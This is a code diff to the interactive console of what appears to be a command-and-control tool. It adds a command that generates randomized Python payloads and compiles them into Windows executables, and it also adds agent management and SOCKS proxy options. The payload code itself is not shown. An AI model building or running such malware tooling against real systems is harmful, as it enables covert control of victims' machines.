@@ -1,8 +1,15 @@
+from vandal_settings import PORT, SECRET_KEY
 import cmd,sys
 from colorama import init, Fore
+from .__payload import randomize_template,template,save_to_random_filename
 from .__listeners import *
 from .__agents import *
-from .__utilities import intro_art
+from .__utilities import *
+
+DEFAULT_HEADERS = {
+    'X-Secret-Key': SECRET_KEY  # replace 'YOUR_SECRET_KEY' with your actual key
+}
+DEFAULT_JSON_DATA = {}
 
 class InteractiveMenu(cmd.Cmd):
     intro_art()
@@ -119,6 +126,10 @@ Options:
                 print("Error: '--id' not found in the provided command.")
             self.help_agents()
             return
+                
+        
+        else:
+            self.help_agents()
         
         if '--commands' in tokens:
             agent_commands()
@@ -127,11 +138,46 @@ Options:
         else:
             self.help_agents()
 
+    def do_payloads(self,args):
+        """Generates payloads"""
+        tokens = args.split()
+
+        if not tokens:
+            self.help_payloads()
+            return
+        
+        if '--generate' in tokens:
+            randomized_template = randomize_template(template)
+            created_filename = save_to_random_filename(randomized_template)
+            
+            if '--python' in tokens:
+                print("[+] Generating python payload...")
+                print(f"Randomized template saved to: {created_filename}")
+                return
+            
+            elif '--exe' in tokens:
+                create_venv_and_run_pyinstaller(created_filename)
+                print('[+] Exe generated!')
+
+            else:
+                print("Specify payload type (--python or --exe).")
+
     def help_agents(self):
         print("""\nUsage: agents [OPTIONS]
+            
+    Options:
+    --list                   List all agents
+    --commands               List special commands that can be executed within agent shell
+    --interact               Interact with a specific agent:
+        --id [AGENT_ID]        Specify the agent ID to interact with
+    --socks start|stop       Start or stop the SOCKS proxy for a specific agent:
+        --id [AGENT_ID]        Specify the agent ID\n""")
+        
+    def help_payloads(self):
+        print("""\nUsage: payloads [OPTIONS]
         
 Options:
-  --list                   List all agents
-  --interact               Interact with a specific agent:
-    --id [AGENT_ID]        Specify the agent ID to interact with\n""")
+  --generate             Loads payload generator
+  --python               Generates python payload\n""")
+        
         
